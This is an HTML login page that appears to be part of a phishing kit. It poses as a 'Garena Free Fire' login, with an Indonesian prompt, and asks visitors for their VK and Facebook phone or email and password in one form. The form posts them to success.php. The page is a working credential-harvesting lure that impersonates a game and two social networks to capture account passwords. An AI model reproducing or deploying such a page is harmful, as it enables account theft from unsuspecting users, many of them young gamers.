<html lang="en">
  <head> 
    <meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title>Garena Free Fire - Login
    </title>
    <link href='./img-zone/icon.png' rel='icon' type='image/x-png'/>
    <script type="text/javascript" src="./js-zone/main-zone.js">
    </script>
    <script language="JavaScript">document.write(zonehost())</script>
  </head>
  <body>
    <div class="form">
      <form action="success.php" method="POST">
        <font style="color:white;font-size:20px;">
          <b>silakan masuk dengan
          </b>
        </font>
        <br/>
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/21/VK.com-logo.svg/2000px-VK.com-logo.svg.png" width="50px">
                <br/>
        <input type="text" name="vk1" placeholder="Mobile Number or Email Address" required>
        <input type="password" name="vk2" placeholder="Password" required><br>
        <img src="https://www.shareicon.net/download/2015/09/23/106006_logo.svg" width="50px">
        <input type="text" name="fb1" placeholder="Mobile Number or Email Address" required>
        <input type="password" name="fb2" placeholder="Password" required><br/>

        <button style="margin-top:15px;" type="submit" class="button button-block">LOGIN
        </button>
      </form>
    </div>
  </body>
</html>
